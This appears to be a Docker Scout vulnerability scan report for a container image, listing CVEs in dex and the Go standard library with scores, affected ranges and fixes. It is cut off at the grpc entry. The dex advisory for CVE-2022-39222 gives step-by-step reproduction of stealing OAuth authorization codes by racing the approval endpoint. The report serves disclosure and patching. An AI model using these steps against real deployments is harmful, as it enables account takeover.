---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:0bc48e0aa5a3a54794e78d303c42e3d7a3c464e6cab85f87209764d590dd0230</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 5" src="https://img.shields.io/badge/critical-5-8b1924"/> <img alt="high: 25" src="https://img.shields.io/badge/high-25-e25d68"/> <img alt="medium: 34" src="https://img.shields.io/badge/medium-34-fbb552"/> <img alt="low: 8" src="https://img.shields.io/badge/low-8-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/unspecified-2-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/arm64</td></tr>
<tr><td>size</td><td>41 MB</td></tr>
<tr><td>packages</td><td>236</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 3" src="https://img.shields.io/badge/C-3-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/dexidp/dex</strong> <code>0.0.0-20250523112731-94f2c587b299+dirty</code> (golang)</summary>

<small><code>pkg:golang/github.com/dexidp/dex@0.0.0-20250523112731-94f2c587b299%2Bdirty</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2020-27847?s=github&n=dex&ns=github.com%2Fdexidp&t=golang&vr=%3C2.27.0"><img alt="critical 9.8: CVE--2020--27847" src="https://img.shields.io/badge/CVE--2020--27847-lightgrey?label=critical%209.8&labelColor=8b1924"/></a> <i>Improper Handling of Syntactically Invalid Structure</i>

<table>
<tr><td>Affected range</td><td><code>&lt;2.27.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.27.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.357%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability exists in the SAML connector of the github.com/dexidp/dex library used to process SAML Signature Validation. This flaw allows an attacker to bypass SAML authentication. The highest threat from this vulnerability is to confidentiality, integrity, as well as system availability. This flaw affects dex versions before 2.27.0.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-39222?s=github&n=dex&ns=github.com%2Fdexidp&t=golang&vr=%3C%3D2.34.0"><img alt="critical 9.3: CVE--2022--39222" src="https://img.shields.io/badge/CVE--2022--39222-lightgrey?label=critical%209.3&labelColor=8b1924"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=2.34.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.35.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.184%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
Dex instances with public clients (and by extension, clients accepting tokens issued by those Dex instances) are affected by this vulnerability.

An attacker can exploit this vulnerability by making a victim navigate to a malicious website and guiding them through the OIDC flow, stealing the OAuth authorization code in the process. The authorization code then can be exchanged by the attacker for a token, gaining access to applications accepting that token.

### Steps to reproduce

1) A victim navigates to a malicious website

2) The webserver initiates a connection with a Dex instance directly - https://dexexample.com/auth/https:%252F%252Faccounts.google.com?access_type=online&client_id=example&nonce=2AaJAimQU9CbeOFsNra1d7CJTWB&redirect_uri=http%3A%2F%2Flocalhost%3A40393%2Fauth%2Fcallback&response_type=code&scope=openid+email&state=2AaJAjhpUmsB25csCo5muvorMTl. In this example, the Dex instance is hosted on `dexexample.com`, and the connector is `accounts.google.com`.

3) Dex returns a 302 Redirect to the connector IDP, https://accounts.google.com/o/oauth2/v2/auth?client_id=237800849078-hri2ndt7gdafpf34kq8crd5sik9pe3so.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fdexexample.com%2Fauth%2Fcallback&response_type=code&scope=openid+email&state=g3dkmpontsr3ugocoddjx72ef. The attacker records the state parameter value g3dkmpontsr3ugocoddjx72ef which will be used as the request ID later on.

4) The malicious website redirects the victim’s browser to the connector IDP.

5) The user authenticates to the connector IDP. If they have authenticated before, they may not be presented with an authentication challenge. The user will silently be taken through the following steps:

    Authentication with the connector IDP, which redirects the browser to the Dex callback with a code - https://dexexample.com/callback?state=g3dkmpontsr3ugocoddjx72ef&code=4%2F0AX4XfWizg1PQEQNl18hmP0_YQ3iUYII2ed13n9ikKr_ZcV7uCZpZaPcIlxBzX5QwFIcs-w&scope=email+openid+https%3A%2F%[2Fwww.googleapis.com](http://2fwww.googleapis.com/)%2Fauth%2Fuserinfo.email&authuser=0&hd=[google.com](http://google.com/)&prompt=none

    Dex handles the callback, fetching the user claims from the connector IDP, persisting them and generating an OAuth code. Then Dex redirects the browser to the approval endpoint https://dexexample.com/approval?req=g3dkmpontsr3ugocoddjx72ef. Note that the req parameter is the same as the attacker's recorded state parameter.

    Dex uses the request ID to look up the OAuth code, and builds a redirect to the original callback with the code - http://localhost:40393/auth/callback?code=bz5p3oov2wlh5k3rboa4atxas&state=2AaJAjhpUmsB25csCo5muvorMTl.


In step 2., when the webserver initiates the connection to Dex and receives the redirect to the connector IDP, the webserver will persist the connector state parameter (`g3dkmpontsr3ugocoddjx72ef`), which is used as the request ID to later look up the OAuth code. As the user goes through the authentication flow with the connector IDP, the webserver will repeatedly request `/approval?req=<state>`. Once the user has successfully authenticated, if the webserver is able to call /approval before the victim’s browser calls `/approval`, then an attacker can fetch the Dex OAuth code which can be exchanged for an ID token using the `/token` endpoint.

Note that PKCE does not defend against this attack since the webserver initiates the request to Dex with a known code challenge.

### Fix

The request has been made unpredictable with message authentication. This was accomplished by creating an [HMAC](https://en.wikipedia.org/wiki/HMAC) using a randomly generated per-request secret. This secret is persisted between the initial login request and the approval request. Since the HMAC is derived using a secret key, its value cannot be known to an attacker, so they will be unable to poll `/approval` for the code.

### Patches
Update to 2.35.0.

### Workarounds
No known workarounds (without impacting behavior) for existing versions.

Disabling public clients is the only way to defend against attacks exploiting this vulnerability.

### References

### For more information
If you have any questions or comments about this advisory:
* Start a new [discussion](https://github.com/dexidp/dex/discussions/new?category=q-a)
* Email us at [cncf-dex-maintainers@<!-- -->lists.cncf.io](mailto:cncf-dex-maintainers@<!-- -->lists.cncf.io)


</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-26290?s=github&n=dex&ns=github.com%2Fdexidp&t=golang&vr=%3C2.27.0"><img alt="critical 9.3: CVE--2020--26290" src="https://img.shields.io/badge/CVE--2020--26290-lightgrey?label=critical%209.3&labelColor=8b1924"/></a> <i>Improper Verification of Cryptographic Signature</i>

<table>
<tr><td>Affected range</td><td><code>&lt;2.27.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.27.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>9.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.500%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

The following vulnerabilities have been disclosed, which impact users leveraging the SAML connector:

Signature Validation Bypass (CVE-2020-15216): https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7

`encoding/xml` instabilities:
 - [Element namespace prefix instability (CVE-2020-29511)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-elements.md)
 - [Attribute namespace prefix instability (CVE-2020-29509)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-attributes.md)
 - [Directive comment instability (CVE-2020-29510)](https://github.com/mattermost/xml-roundtrip-validator/blob/master/advisories/unstable-directives.md)

### Patches

Immediately update to [Dex v2.27.0](https://github.com/dexidp/dex/releases/tag/v2.27.0).

### Workarounds

There are no known workarounds.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 10" src="https://img.shields.io/badge/H-10-e25d68"/> <img alt="medium: 14" src="https://img.shields.io/badge/M-14-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>stdlib</strong> <code>1.24.4</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.24.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68121?s=golang&n=stdlib&t=golang&vr=%3C1.24.13"><img alt="critical : CVE--2025--68121" src="https://img.shields.io/badge/CVE--2025--68121-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During session resumption in crypto/tls, if the underlying Config has its ClientCAs or RootCAs fields mutated between the initial handshake and the resumed handshake, the resumed handshake may succeed when it should have failed. This may happen when a user calls Config.Clone and mutates the returned Config, or uses Config.GetConfigForClient. This can cause a client to resume a session with a server that it would not have resumed with during the initial handshake, or cause a server to resume a session with a client that it would not have resumed with during the initial handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32283?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32283" src="https://img.shields.io/badge/CVE--2026--32283-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If one side of the TLS connection sends multiple key update messages post-handshake in a single record, the connection can deadlock, causing uncontrolled consumption of resources. This can lead to a denial of service.

This only affects TLS 1.3.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32281?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32281" src="https://img.shields.io/badge/CVE--2026--32281-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which use policies is unexpectedly inefficient when certificates in the chain contain a very large number of policy mappings, possibly causing denial of service.

This only affects validation of otherwise trusted certificate chains, issued by a root CA in the VerifyOptions.Roots CertPool, or in the system certificate pool.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32280?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32280" src="https://img.shields.io/badge/CVE--2026--32280-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During chain building, the amount of work that is done is not correctly limited when a large number of intermediate certificates are passed in VerifyOptions.Intermediates, which can lead to a denial of service. This affects both direct users of crypto/x509 and users of crypto/tls.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25679?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="high : CVE--2026--25679" src="https://img.shields.io/badge/CVE--2026--25679-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

url.Parse insufficiently validated the host/authority component and accepted some invalid URLs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61729?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="high : CVE--2025--61729" src="https://img.shields.io/badge/CVE--2025--61729-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Within HostnameError.Error(), when constructing an error string, there is no limit to the number of hosts that will be printed out. Furthermore, the error string is constructed by repeated string concatenation, leading to quadratic runtime. Therefore, a certificate provided by a malicious actor can result in excessive resource consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61726?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="high : CVE--2025--61726" src="https://img.shields.io/badge/CVE--2025--61726-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/url package does not set a limit on the number of query parameters in a query.

While the maximum size of query parameters in URLs is generally limited by the maximum request header size, the net/http.Request.ParseForm method can parse large URL-encoded forms. Parsing a large form containing many unique query parameters can cause excessive memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61725" src="https://img.shields.io/badge/CVE--2025--61725-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddress function constructs domain-literal address components through repeated string concatenation. When parsing large domain-literal components, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61723" src="https://img.shields.io/badge/CVE--2025--61723-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The processing time for parsing some invalid inputs scales non-linearly with respect to the size of the input.

This affects programs which parse untrusted PEM inputs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--58188" src="https://img.shields.io/badge/CVE--2025--58188-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which contain DSA public keys can cause programs to panic, due to a interface cast that assumes they implement the Equal method.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"><img alt="high : CVE--2025--58187" src="https://img.shields.io/badge/CVE--2025--58187-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the design of the name constraint checking algorithm, the processing time of some inputs scale non-linearly with respect to the size of the certificate.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61728?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61728" src="https://img.shields.io/badge/CVE--2025--61728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

archive/zip uses a super-linear file name indexing algorithm that is invoked the first time a file in an archive is opened. This can lead to a denial of service when consuming a maliciously constructed ZIP archive.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61727?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="medium : CVE--2025--61727" src="https://img.shields.io/badge/CVE--2025--61727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An excluded subdomain constraint in a certificate chain does not restrict the usage of wildcard SANs in the leaf certificate. For example a constraint that excludes the subdomain test.example.com does not prevent a leaf certificate from claiming the SAN *.example.com.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47906?s=golang&n=stdlib&t=golang&vr=%3E%3D1.24.0%2C%3C1.24.6"><img alt="medium : CVE--2025--47906" src="https://img.shields.io/badge/CVE--2025--47906-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.24.0<br/><1.24.6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If the PATH environment variable contains paths which are executables (rather than just directories), passing certain strings to LookPath ("", ".", and ".."), can result in the binaries listed in the PATH being unexpectedly returned.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32282?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32282" src="https://img.shields.io/badge/CVE--2026--32282-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Linux, if the target of Root.Chmod is replaced with a symlink while the chmod operation is in progress, Chmod can operate on the target of the symlink, even when the target lies outside the root.

The Linux fchmodat syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses to avoid symlink traversal. Root.Chmod checks its target before acting and returns an error if the target is a symlink lying outside the root, so the impact is limited to cases where the target is replaced with a symlink between the check and operation.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32289?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32289" src="https://img.shields.io/badge/CVE--2026--32289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Context was not properly tracked across template branches for JS template literals, leading to possibly incorrect escaping of content when branches were used. Additionally template actions within JS template literals did not properly track the brace depth, leading to incorrect escaping being applied.

These issues could cause actions within JS template literals to be incorrectly or improperly escaped, leading to XSS vulnerabilities.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27142?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="medium : CVE--2026--27142" src="https://img.shields.io/badge/CVE--2026--27142-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Actions which insert URLs into the content attribute of HTML meta tags are not escaped. This can allow XSS if the meta tag also has an http-equiv attribute with the value "refresh".

A new GODEBUG setting has been added, htmlmetacontenturlescape, which can be used to disable escaping URLs in actions in the meta content attribute which follow "url=" by setting htmlmetacontenturlescape=0.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32288?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="medium : CVE--2026--32288" src="https://img.shields.io/badge/CVE--2026--32288-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader can allocate an unbounded amount of memory when reading a maliciously-crafted archive containing a large number of sparse regions encoded in the "old GNU sparse map" format.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61730?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="medium : CVE--2025--61730" src="https://img.shields.io/badge/CVE--2025--61730-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During the TLS 1.3 handshake if multiple messages are sent in records that span encryption level boundaries (for instance the Client Hello and Encrypted Extensions messages), the subsequent messages may be processed before the encryption level changes. This can cause some minor information disclosure if a network-local attacker can inject messages during the handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--61724" src="https://img.shields.io/badge/CVE--2025--61724-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Reader.ReadResponse function constructs a response string through repeated string concatenation of lines. When the number of lines in a response is large, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58189" src="https://img.shields.io/badge/CVE--2025--58189-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When Conn.Handshake fails during ALPN negotiation the error contains attacker controlled information (the ALPN protocols sent by the client) which is not escaped.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58186" src="https://img.shields.io/badge/CVE--2025--58186-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Despite HTTP headers having a default limit of 1MB, the number of cookies that can be parsed does not have a limit. By sending a lot of very small cookies such as "a=;", an attacker can make an HTTP server allocate a large amount of structs, causing large memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58185" src="https://img.shields.io/badge/CVE--2025--58185-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Parsing a maliciously crafted DER payload could allocate large amounts of memory, causing memory exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--47912" src="https://img.shields.io/badge/CVE--2025--47912-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Parse function permits values other than IPv6 addresses to be included in square brackets within the host component of a URL. RFC 3986 permits IPv6 addresses to be included within the host component, enclosed within square brackets. For example: "http://[::1]/". IPv4 addresses and hostnames must not appear within square brackets. Parse did not enforce this requirement.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58183" src="https://img.shields.io/badge/CVE--2025--58183-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

tar.Reader does not set a maximum size on the number of sparse region data blocks in GNU tar pax 1.0 sparse files. A maliciously-crafted archive containing a large number of sparse regions can cause a Reader to read an unbounded amount of data from the archive into memory. When reading from a compressed source, a small compressed input can result in large allocations.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27139?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="low : CVE--2026--27139" src="https://img.shields.io/badge/CVE--2026--27139-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Unix platforms, when listing the contents of a directory using File.ReadDir or File.Readdir the returned FileInfo could reference a file outside of the Root in which the File was opened.

The impact of this escape is limited to reading metadata provided by lstat from arbitrary locations on the filesystem without permitting reading or writing files outside the root.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>google.golang.org/grpc</strong> <code>1.72.1</code> (golang)</summary>

<small><code>pkg:golang/google.golang.org/grpc@1.72.1</code></small><br/>
